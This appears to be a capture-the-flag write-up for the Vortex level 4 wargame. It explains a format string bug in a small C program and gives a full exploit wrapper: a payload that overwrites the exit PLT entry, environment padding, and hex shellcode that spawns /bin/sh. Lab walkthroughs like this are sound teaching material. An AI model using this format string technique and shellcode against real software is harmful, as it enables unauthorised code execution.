Basic level! Just a format string vulnerability.

                    vortex4.c
  ┌──────────────────────────────────────────────────┐
  │ // -- andrewg, original author was zen-parse :)  │
  │ #include <stdlib.h>                              │
  │                                                  │
  │                                                  │
  │ int main(int argc, char **argv)                  │
  │ {                                                │
  │         if(argc) exit(0);                        │
  │         printf(argv[3]);                         │
  │         exit(EXIT_FAILURE);                      │
  │ }                                                │
  └──────────────────────────────────────────────────┘

All this level does is check that argc is null (exiting if it isn't), then 'printf(argv[3])'.

Similary to utumno5, passing in a large enough clean & custom environment pushes our own data into argv.

To beat this level, we just leverage that format string to overwrite exit in the plt like we've done before (since this level doesn't return).

Doing so, we can point exit to our shellcode directly and net a shell! I did this using a wrapper (with an automated script to upload, compile, and execute it on the server).

                                      serverwrapper.c
 ┌─────────────────────────────────────────────────────────────────────────────────────────────────┐
 │ #include <unistd.h>                                                                             │
 │                                                                                                 │
 │ //exit: 0x804a014                                                                               │
 │ //shellcode: 0xffffdfc6                                                                         │
 │ //0xffff = 65535                                                                                │
 │ //0xdfc6 = 57286                                                                                │
 │ //57278=57286-8                                                                                 │
 │ //payload will be:                                                                              │
 │ //higherExit + lowerExit + 57278 spaces (0xdfc6) + write to lower + 8249 spaces (0xffff)        │
 │ //+ write to higher                                                                             │
 │                                                                                                 │
 │ int main(void) {                                                                                │
 │     char payload[80] = "\x16\xa0\x04\x08\x14\xa0\x04\x08""%57278d%118$hn%8249d%117$hn";         │
 │                                                                                                 │
 │     char *environment[19] = {"AAAA", "BBBB", payload, "DDDDDDDD", "EEEE", "FFFF", "GGGG",       │
 │     "HHHH", "IIII", "JJJJ", "KKKK", "LLLL", "MMMM", "NNNN", "OOOO", "PPPP", "QQQQ",             │
 │     "SHELLCODE=\x50\xd4\xff\xff\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x89\xe5\x31\xc0\x50             │
 │     \x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x8d\x0c\x24\x31\xc0\x50\x51\x8b\x1c\x24            │
 │     \x89\xe1\xb0\x0b\xcd\x80", 0};                                                              │
 │                                                                                                 │
 │     char *empty[] = {NULL};                                                                     │
 │     execve("/vortex/vortex4", empty, environment);                                              │
 │ }                                                                                               │
 └─────────────────────────────────────────────────────────────────────────────────────────────────┘
